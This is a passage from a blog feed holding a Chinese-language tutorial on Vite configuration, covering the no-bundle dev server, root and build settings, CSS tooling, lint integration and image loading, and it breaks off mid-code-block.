依赖优化</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工程化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vite 配置</title>
      <link href="/2024/03/29/frontend/engineering/vite-pei-zhi/"/>
      <url>/2024/03/29/frontend/engineering/vite-pei-zhi/</url>
      
        <content type="html"><![CDATA[<p><a name="TOzj4"></a></p><h2 id="no-bundle-的理念"><a href="#no-bundle-的理念" class="headerlink" title="no-bundle 的理念"></a>no-bundle 的理念</h2><p>通过 Vite 初始化的项目，在项目根目录中有一个 <strong>index.html</strong> 文件，这个文件十分关键。<br />因为 Vite 默认会把项目根目录下的 index.html 作为入口文件。也就是说，当你访问 <a href="http://localhost:3000/">http://localhost:3000</a> 的时候，Vite 的 Dev Server 会自动返回这个 HTML 文件的内容。<br />我们来看看这个 HTML 究竟写了什么：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/src/favicon.svg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Vite App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/src/main.ts&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这个 HTML 文件的内容非常简洁，在 body 标签中除了 id 为 root 的根节点之外，还包含了一个声明了 type&#x3D;”module” 的 script 标签<br />由于现代浏览器原生支持了 ES 模块规范，因此原生的 ES 语法也可以直接放到浏览器中执行，只需要在 script 标签中声明 type&#x3D;”module” 即可。比如上面的 script 标签就声明了 type&#x3D;”module”，同时 src 指向了 &#x2F;src&#x2F;main.ts 文件，<strong>此时相当于请求了 <a href="http://localhost:3000/src/main.ts">http://localhost:3000/src/main.ts</a> 这个资源</strong>，Vite 的 Dev Server 此时会接受到这个请求，然后读取对应的文件内容，进行一定的中间处理，最后将处理的结果返回给浏览器。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695018928193-bdf92d5c-95cc-4589-a079-33af38f0874b.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695018928193-bdf92d5c-95cc-4589-a079-33af38f0874b.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />这里我们需要知道的是</p><ol><li><strong>Vite 会将项目的源代码编译成浏览器可以识别的代码</strong></li><li><strong>与此同时，一个 import 语句即代表了一个 HTTP 请求，Vite Dev Server 会根据这些 HTTP 请求读取本地文件，返回浏览器可以解析的代码。当浏览器解析到新的 import 语句，又会发出新的请求，以此类推，直到所有的资源都加载完成。</strong></li></ol><p>现在，你应该知道了 Vite 所倡导的 no-bundle 理念的真正含义：利用浏览器原生 ES 模块的支持，实现开发阶段的 Dev Server，进行模块的按需加载，而不是先整体打包再进行加载。相比 Webpack 这种必须打包再加载的传统构建模式，Vite 在开发阶段省略了繁琐且耗时的打包过程，这也是它为什么快的一个重要原因。</p><p>Vite 当中支持多种配置文件类型，包括 .js、.ts、.mjs 三种后缀的文件，实际项目中一般使用 vite.config.ts 作为配置文件。<br><a name="hT7Ku"></a></p><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>如果页面的入口文件 index.html 并不在项目根目录下，而需要放到 src 目录下，那如何在访问 localhost:3000 的时候让 Vite 自动返回 src 目录下的 index.html 呢？我们可以配置 root</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="comment">// 引入 path 包注意两点:</span></span><br><span class="line"><span class="comment">// 1. 为避免类型报错，你需要通过 `pnpm i @types/node -D` 安装类型</span></span><br><span class="line"><span class="comment">// 2. tsconfig.node.json 中设置 `allowSyntheticDefaultImports: true`，以允许下面的 default 导入方式</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span></span><br><span class="line"><span class="keyword">import</span> react <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 手动指定项目根目录位置</span></span><br><span class="line">  <span class="attr">root</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="title function_">react</span>()]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当手动指定 root 参数之后，Vite 会自动从这个路径下寻找 index.html 文件<br><a name="wz6ll"></a></p><h2 id="生产环境构建"><a href="#生产环境构建" class="headerlink" title="生产环境构建"></a>生产环境构建</h2><p>有人说 Vite 因为其不打包的特性而不能上生产环境，其实这种观点是相当有误的。<br />在开发阶段 Vite 通过 Dev Server 实现了不打包的特性，而<strong>在生产环境中，Vite 依然会基于 Rollup 进行打包，并采取一系列的打包优化手段。</strong><br />从脚手架项目的 package.json 中就可见一斑：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="comment">// 开发阶段启动 Vite Dev Server</span></span><br><span class="line">  <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 生产环境打包</span></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tsc &amp;&amp; vite build&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 生产环境打包完预览产物</span></span><br><span class="line">  <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>但可能你会有点疑惑，为什么在 vite build 命令执行之前要先执行 tsc 呢？<br />tsc 作为 TypeScript 的官方编译命令，可以用来编译 TypeScript 代码并进行类型检查，而这里的作用主要是用来做类型检查，我们可以从项目的 tsconfig.json 中注意到这样一个配置：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 省略其他配置</span></span><br><span class="line">    <span class="comment">// 1. noEmit 表示只做类型检查，而不会输出产物文件</span></span><br><span class="line">    <span class="comment">// 2. 这行配置与 tsc --noEmit 命令等效</span></span><br><span class="line">    <span class="attr">&quot;noEmit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>虽然 Vite 提供了开箱即用的 TypeScript 以及 JSX 的编译能力，但实际上底层并没有实现 TypeScript 的类型校验系统，因此需要借助 tsc 来完成类型校验（在 Vue 项目中使用 vue-tsc 这个工具来完成），在打包前提早暴露出类型相关的问题，以保证代码的健壮性。</p><p><a name="W2Quf"></a></p><h2 id="CSS-样式方案"><a href="#CSS-样式方案" class="headerlink" title="CSS 样式方案"></a>CSS 样式方案</h2><p>如果我们不用任何 CSS 工程方案，会出现哪些问题？</p><ol><li><strong>开发体验欠佳</strong>。比如原生 CSS 不支持选择器的嵌套</li><li><strong>样式污染问题</strong>。如果出现同样的类名，很容易造成不同的样式互相覆盖和污染</li><li><strong>浏览器兼容问题</strong>。为了兼容不同的浏览器，我们需要对一些属性（如 transition）加上不同的浏览器前缀，比如 -webkit-、-moz-、-ms-、-o-，意味着开发者要针对同一个样式属性写很多的冗余代码。</li><li><strong>打包后的代码体积问题</strong>。如果不用任何的 CSS 工程化方案，所有的 CSS 代码都将打包到产物中（即使有部分样式并没有在代码中使用），导致产物体积过大。</li></ol><p>针对如上原生 CSS 的痛点，社区中诞生了不少解决方案，常见的有 5 类：</p><ol><li>css 预处理器 Sass&#x2F;Scss、Less 和 Stylus，这些方案各自定义了一套语法，让 CSS 也能使用嵌套规则，甚至能像编程语言一样定义变量、写条件判断和循环语句，大大增强了样式语言的灵活性，解决原生 CSS 的<strong>开发体验问题</strong>。</li><li>CSS 后处理器 PostCSS，用来解析和处理 CSS 代码，可以实现的功能非常丰富，比如将 px 转换为 rem、根据目标浏览器情况自动加上类似于–moz–、-o-的属性前缀等等。</li><li>CSS Modules，能将 CSS 类名处理成哈希值，这样就可以避免同名的情况下<strong>样式污染</strong>的问题。</li><li>CSS in JS 方案</li><li>CSS 原子化框架，如 Tailwind CSS、Windi CSS，通过类名来指定样式，大大简化了样式写法，提高了样式开发的效率，主要解决了原生 CSS <strong>开发体验</strong>的问题。</li></ol><p>Vite 本身对 CSS 各种预处理器语言（Sass&#x2F;Scss、Less 和 Stylus）做了内置支持，也就是说，即使你不经过任何的配置也可以直接使用各种 CSS 预处理器。<br />Vite 底层会调用 CSS 预处理器的官方库进行编译，而 Vite 为了实现按需加载，并没有内置这些工具库，而是让用户根据需要安装。所以我们依然需要安装它们。</p><p>CSS Modules 在 Vite 也是一个开箱即用的能力，Vite 会对后缀带有 .module 的样式文件自动应用 CSS Modules。接下来我们通过一个简单的例子来使用这个功能。</p><p><a name="NL6zm"></a></p><h3 id="自动引入"><a href="#自动引入" class="headerlink" title="自动引入"></a>自动引入</h3><p>每次要使用 $theme-color 属性的时候我们都需要手动引入其所在的 variable.scss 文件，那有没有自动引入的方案呢？</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&quot;../../variable&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.header</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: $theme-color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就需要在 Vite 中进行一些自定义配置了，在配置文件中增加如下的内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; normalizePath &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span>;</span><br><span class="line"><span class="comment">// 如果类型报错，需要安装 @types/node: pnpm i @types/node -D</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局 scss 文件的路径</span></span><br><span class="line"><span class="comment">// 用 normalizePath 解决 window 下的路径问题</span></span><br><span class="line"><span class="keyword">const</span> variablePath = <span class="title function_">normalizePath</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;./src/variable.scss&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// css 相关的配置</span></span><br><span class="line">  <span class="attr">css</span>: &#123;</span><br><span class="line">    <span class="attr">preprocessorOptions</span>: &#123;</span><br><span class="line">      <span class="attr">scss</span>: &#123;</span><br><span class="line">        <span class="comment">// additionalData 的内容会在每个 scss 文件的开头自动注入</span></span><br><span class="line">        <span class="attr">additionalData</span>: <span class="string">`@import &quot;<span class="subst">$&#123;variablePath&#125;</span>&quot;;`</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><a name="M2b9R"></a></p><h3 id="PostCSS"><a href="#PostCSS" class="headerlink" title="PostCSS"></a>PostCSS</h3><p>一般可以通过 postcss.config.js 来配置 postcss，不过在 Vite 配置文件中已经提供了 PostCSS 的配置入口，我们可以直接在 Vite 配置文件中进行操作。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts 增加如下的配置</span></span><br><span class="line"><span class="keyword">import</span> autoprefixer <span class="keyword">from</span> <span class="string">&#x27;autoprefixer&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">css</span>: &#123;</span><br><span class="line">    <span class="comment">// 进行 PostCSS 配置</span></span><br><span class="line">    <span class="attr">postcss</span>: &#123;</span><br><span class="line">      <span class="attr">plugins</span>: [</span><br><span class="line">        <span class="title function_">autoprefixer</span>(&#123;</span><br><span class="line">          <span class="comment">// 指定目标浏览器</span></span><br><span class="line">          <span class="attr">overrideBrowserslist</span>: [<span class="string">&#x27;Chrome &gt; 40&#x27;</span>, <span class="string">&#x27;ff &gt; 31&#x27;</span>, <span class="string">&#x27;ie 11&#x27;</span>]</span><br><span class="line">        &#125;)</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="qMoaq"></a></p><h3 id="CSS-原子化框架"><a href="#CSS-原子化框架" class="headerlink" title="CSS 原子化框架"></a>CSS 原子化框架</h3><p>在目前的社区当中，CSS 原子化框架主要包括 Tailwind CSS 和 Windi CSS。<br />Windi CSS 作为前者的替换方案，实现了按需生成 CSS 类名的功能，开发环境下的 CSS 产物体积大大减少，速度上比 Tailwind CSS v2 快 20~100 倍。<br />当然，Tailwind CSS 在 v3 版本也引入 <a href="https://link.juejin.cn/?target=https://v2.tailwindcss.com/docs/just-in-time-mode">JIT(即时编译)</a> 的功能，解决了开发环境下 CSS 产物体积庞大的问题。</p><p>如果要将这两个方案接入到 Vite 中，则需要使用它们自己定义的插件和 postcss 配置。</p><p><a name="CkW40"></a></p><h2 id="Lint-工具链"><a href="#Lint-工具链" class="headerlink" title="Lint 工具链"></a>Lint 工具链</h2><p><a name="gRTFI"></a></p><h3 id="ESLint：JS-x2F-TS-规范工具"><a href="#ESLint：JS-x2F-TS-规范工具" class="headerlink" title="ESLint：JS&#x2F;TS 规范工具"></a>ESLint：JS&#x2F;TS 规范工具</h3><p><a name="Ng12C"></a></p><h3 id="与-Prettier-强强联合"><a href="#与-Prettier-强强联合" class="headerlink" title="与 Prettier 强强联合"></a>与 Prettier 强强联合</h3><p><a name="SUOfc"></a></p><h3 id="在-Vite-中接入-ESLint"><a href="#在-Vite-中接入-ESLint" class="headerlink" title="在 Vite 中接入 ESLint"></a>在 Vite 中接入 ESLint</h3><p>除了安装编辑器插件的方法之外，我们也可以直接通过 Vite 插件的方式在开发阶段进行 ESLint 扫描，以命令行的方式展示出代码中的规范问题，并能够直接定位到原文件。<br />首先我们安装 Vite 中的 ESLint 插件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm i vite-plugin-eslint -D</span><br></pre></td></tr></table></figure><p>然后在 vite.config.ts 中接入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite.config.ts</span></span><br><span class="line"><span class="keyword">import</span> viteEslint <span class="keyword">from</span> <span class="string">&#x27;vite-plugin-eslint&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体配置</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// 省略其它插件</span></span><br><span class="line">    <span class="title function_">viteEslint</span>(),</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在重新启动项目的话， ESLint 的错误就已经能够及时显示到命令行窗口中了<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695021221303-0bebd0a3-0c5f-4782-8176-e009fb2feb9b.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695021221303-0bebd0a3-0c5f-4782-8176-e009fb2feb9b.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><blockquote><p>由于这个插件采用另一个进程来运行 ESLint 的扫描工作，因此不会影响 Vite 项目的启动速度</p></blockquote><p><a name="w5141"></a></p><h3 id="Stylelint：样式规范工具"><a href="#Stylelint：样式规范工具" class="headerlink" title="Stylelint：样式规范工具"></a>Stylelint：样式规范工具</h3><p>Stylelint 主要专注于样式代码的规范检查，内置了 <strong>170 多个 CSS 书写规则</strong>，支持 <strong>CSS 预处理器</strong>（如 Sass、Less），提供<strong>插件化机制</strong>以供开发者扩展规则，已经被 Google、Github 等<strong>大型团队</strong>投入使用。</p><p>与 ESLint 类似，在规范检查方面，Stylelint 已经做的足够专业，而在代码格式化方面，我们仍然需要结合 Prettier 一起来使用。</p><p>首先安装 Stylelint 以及相应的工具套件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm i stylelint stylelint-prettier stylelint-config-prettier stylelint-config-recess-order stylelint-config-standard stylelint-config-standard-scss -D</span><br></pre></td></tr></table></figure><p>然后在 Stylelint 的配置文件 .stylelintrc.js 中使用这些工具套件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .stylelintrc.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// 注册 stylelint 的 prettier 插件</span></span><br><span class="line">  <span class="attr">plugins</span>: [<span class="string">&#x27;stylelint-prettier&#x27;</span>],</span><br><span class="line">  <span class="comment">// 继承一系列规则集合</span></span><br><span class="line">  <span class="attr">extends</span>: [</span><br><span class="line">    <span class="comment">// standard 规则集合</span></span><br><span class="line">    <span class="string">&#x27;stylelint-config-standard&#x27;</span>,</span><br><span class="line">    <span class="comment">// standard 规则集合的 scss 版本</span></span><br><span class="line">    <span class="string">&#x27;stylelint-config-standard-scss&#x27;</span>,</span><br><span class="line">    <span class="comment">// 样式属性顺序规则</span></span><br><span class="line">    <span class="string">&#x27;stylelint-config-recess-order&#x27;</span>,</span><br><span class="line">    <span class="comment">// 接入 Prettier 规则</span></span><br><span class="line">    <span class="string">&#x27;stylelint-config-prettier&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;stylelint-prettier/recommended&#x27;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 配置 rules</span></span><br><span class="line">  <span class="attr">rules</span>: &#123;</span><br><span class="line">    <span class="comment">// 开启 Prettier 自动格式化功能</span></span><br><span class="line">    <span class="string">&#x27;prettier/prettier&#x27;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以发现 Stylelint 的配置文件和 ESLint 还是非常相似的，常用的 plugins、extends 和 rules 属性在 ESLint 同样存在，并且与 ESLint 中这三个属性的功能也基本相同。<br />不过需要强调的是在 Stylelint 中 rules 的配置会和 ESLint 有些区别。</p><p>接下来将 Stylelint 集成到项目中，回到 package.json 中，增加如下的 scripts 配置：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 整合 lint 命令</span></span><br><span class="line">    <span class="attr">&quot;lint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;npm run lint:script &amp;&amp; npm run lint:style&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// stylelint 命令</span></span><br><span class="line">    <span class="attr">&quot;lint:style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stylelint --fix \&quot;src/**/*.&#123;css,scss&#125;\&quot;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然，你也可以在 VSCode 中安装 Stylelint 插件，这样能够在开发阶段即时感知到代码格式问题，提前进行修复。我们也可以直接在 Vite 中集成 Stylelint。社区中提供了 Stylelint 的 Vite 插件：vite-plugin-stylelint，实现在项目开发阶段提前暴露出样式代码的规范问题。<br><a name="DCDna"></a></p><h3 id="Husky-lint-staged-的-Git-提交工作流"><a href="#Husky-lint-staged-的-Git-提交工作流" class="headerlink" title="Husky + lint-staged 的 Git 提交工作流"></a>Husky + lint-staged 的 Git 提交工作流</h3><p>安装了 ESLint、Prettier 和 Stylelint 的 VSCode 插件或者 Vite 插件后，在开发阶段提前规避掉代码格式的问题，但实际上这也只是将问题提前暴露，并不能保证规范问题能完全被解决，还是可能导致线上的代码出现不符合规范的情况。那么如何来避免这类问题呢？</p><p>我们可以在代码提交的时候进行卡点检查。使用 Husky 拦截 git commit 命令，进行代码格式检查，只有确保通过格式检查才允许正常提交代码。</p><p>如果直接在 Husky 的钩子中执行 npm run lint，这会产生一个额外的问题：Husky 中每次执行 npm run lint 都对仓库中的代码进行全量检查，也就是说，即使某些文件并没有改动，也会走一次 Lint 检查，当项目代码越来越多的时候，提交的过程会越来越慢，影响开发体验。<br />而 lint-staged 就是用来解决上述全量扫描问题的，可以实现只对存入暂存区的文件进行 Lint 检查，大大提高了提交代码的效率。如此一来，我们便实现了提交代码时的增量 Lint 检查。</p><p><a name="BGpYn"></a></p><h3 id="commitlint-检查信息提交规范"><a href="#commitlint-检查信息提交规范" class="headerlink" title="commitlint 检查信息提交规范"></a>commitlint 检查信息提交规范</h3><p><a name="pKHsc"></a></p><h2 id="静态资源处理"><a href="#静态资源处理" class="headerlink" title="静态资源处理"></a>静态资源处理</h2><p>静态资源处理是前端工程经常遇到的问题，在真实的工程中不仅仅包含了动态执行的代码，也不可避免地要引入各种静态资源，如图片、JSON、Worker 文件、Web Assembly 文件等等。</p><p>而静态资源本身并不是标准意义上的模块，因此对它们的处理和普通的代码是需要区别对待的。</p><ul><li>一方面我们需要解决<strong>资源加载</strong>的问题，对 Vite 来说就是如何将静态资源解析并加载为一个 ES 模块的问题；</li><li>另一方面，在<strong>生产环境</strong>下我们还需要考虑静态资源的部署问题、体积问题、网络性能问题，并采取相应的方案来进行优化。</li></ul><p><a name="Lhgyw"></a></p><h3 id="图片加载"><a href="#图片加载" class="headerlink" title="图片加载"></a>图片加载</h3><p>图片是项目中最常用的静态资源之一，本身包括了非常多的格式，诸如 png、jpeg、webp、avif、gif，当然，也包括经常用作图标的 svg 格式。这一部分我们主要讨论的是如何加载图片，也就是说怎么让图片在页面中<strong>正常显示</strong>。</p><p><a name="ea8Fy"></a></p><h3 id="三种加载图片的场景"><a href="#三种加载图片的场景" class="headerlink" title="三种加载图片的场景"></a>三种加载图片的场景</h3><p>在 HTML 或者 JSX 中，通过 img 标签来加载图片，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/a.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 CSS 中通过 background 属性加载图片，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&#x27;../../assets/b.png&#x27;</span>) norepeat;</span><br></pre></td></tr></table></figure><p>在 JavaScript 中，通过脚本的方式动态指定图片的 src 属性，如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hero-img&#x27;</span>).<span class="property">src</span> = <span class="string">&#x27;../../assets/c.png&#x27;</span></span><br></pre></td></tr></table></figure><p><a name="iRxLa"></a></p><h4 id="在-Vite-中使用"><a href="#在-Vite-中使用" class="headerlink" title="在 Vite 中使用"></a>在 Vite 中使用</h4><p>配置别名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 